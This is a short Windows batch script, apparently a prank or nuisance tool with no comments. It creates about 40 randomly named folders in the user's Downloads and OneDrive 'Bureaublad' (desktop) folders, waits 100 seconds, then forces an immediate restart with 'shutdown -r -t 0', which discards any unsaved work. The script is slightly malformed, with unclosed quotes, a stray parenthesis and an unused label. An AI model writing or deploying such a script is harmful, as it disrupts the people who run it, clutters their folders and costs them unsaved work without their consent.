md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%)
timeout 100
shutdown -r -t 0
:end
exit